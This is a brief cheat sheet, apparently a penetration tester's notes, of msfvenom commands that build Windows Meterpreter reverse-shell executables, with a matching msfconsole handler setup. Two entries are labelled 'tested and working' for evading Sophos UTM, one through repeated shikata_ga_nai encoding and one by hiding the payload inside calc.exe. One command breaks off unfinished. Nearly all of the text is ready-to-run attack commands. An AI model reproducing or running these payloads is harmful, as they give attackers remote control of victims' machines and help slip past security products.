# Msfvenom

Examples of previously created MSFVenom payloads required in the different scenarios

##### Reverse TCP:
```
msfvenom --platform Windows -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=443 -b "\x00" -f exe -o shell.exe
```

##### Evade Sophos UTM - Encoded multiple times - tested and working:
```
msfvenom --platform Windows -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=443 -b "\x00" -f exe -e x86/shikata_ga_nai -i 10 -f exe -o shell.exe
```

##### Evade Sophos UTM - Add Windows Calc.exe as a template - tested and working:
```
msfvenom --platform Windows -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=443 -f exe -x calc.exe -f exe -o calc-shell.exe
```

##### Reverse HTTPS with proxy authentication:
```
msfvenom --platform Windows -p windows/meterpreter/reverse_https HttpProxyUser=user HttpProxyPass=password LHOST=10.0.0.1 LPORT=443 -b 
```

##### MSF Console:
```
msfconsole -q
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
windows/meterpreter/reverse_tcp
set lhost 10.0.0.1
set lport 443
exploit -j
```
